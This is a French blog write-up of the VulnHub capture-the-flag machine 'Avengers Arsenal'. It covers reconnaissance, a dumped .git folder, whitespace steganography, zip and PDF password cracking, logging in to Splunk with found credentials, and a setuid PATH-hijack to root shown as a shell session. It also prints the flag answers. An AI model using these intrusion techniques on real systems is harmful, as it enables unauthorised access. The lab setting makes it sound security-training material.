# Solution du CTF Avengers Arsenal de VulnHub

Synchronisation des montres !
-----------------------------

Voilà en cherchant un CTF random sur VulnHub je suis tombé sur une image des Avengers et paf je suis tombé dans le paneau :D  

On a donc le CTF [Avengers Arsenal](https://www.vulnhub.com/entry/ha-avengers-arsenal,369/) qui est fait par [Raj Chandel](https://www.hackingarticles.in/), un autre auteur prolifique de solutions de CTF.  

L'objectif est de récupérer 5 flags chacun avec un nom d'arme d'Avenger (en fait ça va un peu plus loin car il y a par exemple la flèche *Yaka* de *Yondu* dans *Gardiens de la Galaxie*.  

Sceptre
-------

```plain
Nmap scan report for 192.168.56.17
Host is up (0.00020s latency).
Not shown: 65531 closed tcp ports (reset)
PORT     STATE SERVICE         VERSION
80/tcp   open  http            Apache httpd 2.4.29 ((Ubuntu))
|_http-server-header: Apache/2.4.29 (Ubuntu)
| http-robots.txt: 1 disallowed entry 
|_/groot
|_http-title: Avengers Arsenal
| http-git: 
|   192.168.56.17:80/.git/
|     Git repository found!
|     Repository description: Unnamed repository; edit this file 'description' to name the...
|     Remotes:
|_      https://github.com/Ignitetechnologies/Web-Application-Cheatsheet.git
8000/tcp open  http            Splunkd httpd
|_http-server-header: Splunkd
| http-robots.txt: 1 disallowed entry 
|_/
| http-title: Site doesn't have a title (text/html; charset=UTF-8).
|_Requested resource was http://192.168.56.17:8000/en-US/account/login?return_to=%2Fen-US%2F
8089/tcp open  ssl/http        Splunkd httpd
|_http-server-header: Splunkd
|_http-title: splunkd
| http-robots.txt: 1 disallowed entry 
|_/
| ssl-cert: Subject: commonName=SplunkServerDefaultCert/organizationName=SplunkUser
| Not valid before: 2019-09-16T14:51:44
|_Not valid after:  2022-09-15T14:51:44
8191/tcp open  limnerpressure?
| fingerprint-strings: 
|   FourOhFourRequest, GetRequest: 
|     HTTP/1.0 200 OK
|     Connection: close
|     Content-Type: text/plain
|     Content-Length: 85
|_    looks like you are trying to access MongoDB over HTTP on the native driver port.
```

Look mah! Pas de SSH mais des services inhabituels comme *Splunk* et *MongoDB* (qui est assez gentil pour dévoiler son identifité que Nmap n'a pas deviné).  

Pour me connecter au Mongo j'ai utilisé l'appli graphique *Studio 3T*. L'accès nécessitait d'activer le SSL/TLS.  

Une fois connecté aucune base à l'intérieur et pas d'infos intéressantes dans la config visible du serveur.  

Je me suis ensuite penché sur ce dossier *.git* détecté par Nmap en récupérant les fichiers avec [git-dumper](https://github.com/arthaud/git-dumper), l'outil parfait pour récupérer des identifiants de base de données sur des Wordpress versionnés :D  

Je n'ai rien trouvé en explorant les différents messages de commit. En fait il fallait se coltiner la lecture des fichiers à la mano et trouver dans le fichier *log/HEAD* une référence à un dépôt Github qui contenant lui même un commit qui contenait un base64 qui contenant le flag... enfin bref aucun intérêt technique.  

Je lance Wapiti sur le port 80 et je remarque qu'il a trouvé via exploration un fichier *ravagers.html* à la racine du site qui vient le texte suivant :  

```plain
61 67 65 6e 74 3a 61 76 65 6e 67 65 72 73
```

C'est bien sûr de l'hexadécimal qui se traduit en  

```plain
agent:avengers
```

On verra plus tard quoi en faire. En attendant fouillons un peu plus ce serveur web.  

```plain
$ feroxbuster -u http://192.168.56.17/ -w DirBuster-0.12/directory-list-2.3-big.txt -n

 ___  ___  __   __     __      __         __   ___
|__  |__  |__) |__) | /  `    /  \ \_/ | |  \ |__
|    |___ |  \ |  \ | \__,    \__/ / \ | |__/ |___
by Ben "epi" Risher 🤓                 ver: 2.4.0
───────────────────────────┬──────────────────────
 🎯  Target Url            │ http://192.168.56.17/
 🚀  Threads               │ 50
 📖  Wordlist              │ DirBuster-0.12/directory-list-2.3-big.txt
 👌  Status Codes          │ [200, 204, 301, 302, 307, 308, 401, 403, 405, 500]
 💥  Timeout (secs)        │ 7
 🦡  User-Agent            │ feroxbuster/2.4.0
 🚫  Do Not Recurse        │ true
 🎉  New Version Available │ https://github.com/epi052/feroxbuster/releases/latest
───────────────────────────┴──────────────────────
 🏁  Press [ENTER] to use the Scan Cancel Menu™
──────────────────────────────────────────────────
301        9l       28w      315c http://192.168.56.17/images
301        9l       28w      312c http://192.168.56.17/css
403        9l       28w      278c http://192.168.56.17/server-status
301        9l       28w      318c http://192.168.56.17/spammimic
```

Dans ce dossier *spammimic* se trouve un fichier *scepter.txt* qui pourrait sembler vide mais avec la vue source code de Firefox le nombre de lignes ne ment pas.  

Le fichier est composé de whitespaces qui me font penser au langage de programmation ésotérique [Whitespace](https://en.wikipedia.org/wiki/Whitespace_%28programming_language%29) (le bien nommé).  

Sauf qu'ici une recherche sur *spammimic* nous amène à [ce script en ligne](https://www.spammimic.com/decodespace.cgi) qui décode le fichier en flag :  

```plain
Scepter:{469F1394A349DCF8A742653CE093FA80}
```

Une analyze plus poussée du fichier montre que les retours à la ligne correspondent à des séparateurs de caractères, que la tabulation correspond au bit 1 et l'espace au bit 0.  

J'ai écrit un script Python capable de décoder de la même façon :  

```python
import sys

if len(sys.argv) < 2:
    print(f"Usage: python3 {sys.argv[1]} whitespace_filename")
    sys.exit()

def whitespace_to_bit(char):
    if char == "\x09":
        return "1"
    elif char == " ":
        return "0"
    return ""

with open(sys.argv[1], encoding="utf-8", errors="ignore") as fd:
    text = ""
    for line in fd:
        bin_value = "".join([whitespace_to_bit(char) for char in line])
        if not bin_value:
            continue
        text += chr(int(bin_value, 2))
    print(text)
```

Mjølnir
-------

Ensuite il y a ce dossier *groot* qui apparaissait dans le *robots.txt*. Il contient un fichier *hammer.zip* protégé par mdp.  

L'étape obligé c'est l'obtention d'un hash avec *zip2john* puis on y passe la wordlist *rockyou*. C'est vite fait car PKZIP n'est pas un hash costaud, pour autant le mot de passe ne fait pas partie de la wordlist.  

J'ai donc utilisé *Cewl* pour générer une wordlist à partir de la page web du site :  

```plain
docker run -it --rm -v "${PWD}:/host" cewl http://192.168.56.17/ > avengers.txt
```

Je préfère utiliser l'image Docker parce que Ruby... c'est fatiguant à installer (nan mais c'est vrai!)  

Avec un *--rules=all* en plus pour John the Ripper on casse le mot de passe (*Stark12008*). Heureusement que ce n'était pas du bcrypt.  

Du fichier zip on extrait un fichier PDF protégé là encore par mot de passe. Là déjà le casser c'est plus compliqué, l'algo demande plus de puissance. Heureusement il semble assez sujet à une accélération par GPU via [Penglab](https://github.com/mxrch/penglab).  

En revanche même avec différentes règles de Hashcat il n'est pas passé. Je l'aurais sans doute fait tombé avec des règles [KoreLogic](http://contest-2010.korelogic.com/rules-hashcat.html) mais au prix de plusieurs heures d'attente et de l'assassinat de nombreux bébé phoques (réchauffement climatique etc).  

La solution officielle consistait à collecter manuellement des infos sur la page */avengersbook.html* qui correspond à une satire d'un mur Facebook pour *Tony Stark* et de passer le tout à un utilitaire baptisé [CUPP - Common User Passwords Profiler](https://github.com/Mebus/cupp) qui génère une wordlist qui contenait le password attendu (*Tony\_050081*).  

Le flag correspondant :  

```plain
Mjølnir:{4A3232C59ECDA21AC71BEBE3B329BF36}
```

Yaka
----

Au tour de Splunk maintenant !  

Un tour sur exploit-db remonte quelques trucs. Les codes ne sont pas toujours beaux à voir, il est sans doute préférable de regarder du côté de Metasploit.  

```plain

   #  Name                                       Disclosure Date  Rank       Check  Description
   -  ----                                       ---------------  ----       -----  -----------
   0  exploit/multi/http/splunk_upload_app_exec  2012-09-27       good       Yes    Splunk Custom App Remote Code Execution
   1  exploit/multi/http/splunk_mappy_exec       2011-12-12       excellent  Yes    Splunk Search Remote Code Execution
```

Ces deux modules d'exploitation nécessitent des identifiants pour Splunk et ça tombe bien car la paire *agent* / *avengers* est acceptée.  

Seulement une fois connecté le Splunk râle à propos de la licence qui a expiré ce qui nous oblige à passer en licence gratuite qui retire visiblement l'authentification... et les modules Metasploit ne fonctionnent plus :D  

Heureusement il existe une technique de détournement de fonctionnalité (tout comme on peut éditer un thème Wordpress pour exécuter du PHP) qui consiste à uploader une application malicieuse sur le Splunk.  

C'est notemment expliqué en images... [sur le blog de l'auteur du CTF](https://www.hackingarticles.in/penetration-testing-on-splunk/), je vous invite donc à y faire un tour.  

Une fois un shell récupéré et un *LinPEAS* exécuté on voit quelques vulnérabilités sur le système :  

```plain
╔══════════╣ USBCreator
╚ https://book.hacktricks.xyz/linux-unix/privilege-escalation/d-bus-enumeration-and-command-injection-privilege-escalation
Vulnerable!!
```

Ou encore la fameuse faille *Sudo Baron Samedit* mais il y a surtout un binaire setuid à un endroit inhabituel :  

```plain
-rwsr-xr-x 1 root root 8.2K Sep 17  2019 /opt/ignite (Unknown SUID binary)
```

On verra ça ensuite car pour le moment je remarque des fichiers *yaka.xlsx* et *yakahints.txt* dans le même dossier.  

Le fichier texte a le contenu suivant :  

> Guardians Of The Galaxy Vol.1 Release Date is 20 14

20 et 14, surement les coordonnées d'une cellule dans le tableur. Et effectivement en 20N je retrouve le flag :  

```plain
Yaka Arrow:{74E57403424607145B9B77809DEB49D0}
```

Storm Breaker
-------------

 Au tour de ce binaire setuid qui fait exécuter *ifconfig* sans path absolu :  

```plain
splunk@ubuntu:/tmp$ /opt/ignite 
enp0s17: flags=4163<UP,BROADCAST,RUNNING,MULTICAST>  mtu 1500
        inet 192.168.56.17  netmask 255.255.255.0  broadcast 192.168.56.255
        inet6 fe80::f4e6:1143:1664:37ec  prefixlen 64  scopeid 0x20<link>
        ether 08:00:27:44:29:b0  txqueuelen 1000  (Ethernet)
        RX packets 1879536  bytes 267392583 (267.3 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 2044601  bytes 1395857369 (1.3 GB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

lo: flags=73<UP,LOOPBACK,RUNNING>  mtu 65536
        inet 127.0.0.1  netmask 255.0.0.0
        inet6 ::1  prefixlen 128  scopeid 0x10<host>
        loop  txqueuelen 1000  (Local Loopback)
        RX packets 446063  bytes 245096518 (245.0 MB)
        RX errors 0  dropped 0  overruns 0  frame 0
        TX packets 446063  bytes 245096518 (245.0 MB)
        TX errors 0  dropped 0 overruns 0  carrier 0  collisions 0

splunk@ubuntu:/tmp$ cat ifconfig 
#!/bin/bash
bash -p
splunk@ubuntu:/tmp$ chmod +x ifconfig 
splunk@ubuntu:/tmp$ export PATH=.:$PATH
splunk@ubuntu:/tmp$ /opt/ignite 
root@ubuntu:/tmp# id
uid=0(root) gid=1001(splunk) groups=1001(splunk)
root@ubuntu:/tmp# cd /root/
root@ubuntu:/root# ls
final.txt
root@ubuntu:/root# cat final.txt 

 █████╗ ██████╗ ███████╗███████╗███╗   ██╗ █████╗ ██╗     
██╔══██╗██╔══██╗██╔════╝██╔════╝████╗  ██║██╔══██╗██║     
███████║██████╔╝███████╗█████╗  ██╔██╗ ██║███████║██║     
██╔══██║██╔══██╗╚════██║██╔══╝  ██║╚██╗██║██╔══██║██║     
██║  ██║██║  ██║███████║███████╗██║ ╚████║██║  ██║███████╗
╚═╝  ╚═╝╚═╝  ╚═╝╚══════╝╚══════╝╚═╝  ╚═══╝╚═╝  ╚═╝╚══════╝

Storm Breaker:{0C683E44D2F04C6F62B99E87A38CF9CC}    

-----------Contact Undersigned to share your feedback with HACKING ARTICLES Team-------------

https://www.linkedin.com/in/aarti-singh-353698114/
https://twitter.com/pavan2318
https://twitter.com/rajchandel
```



*Published December 28 2021 at 18:47*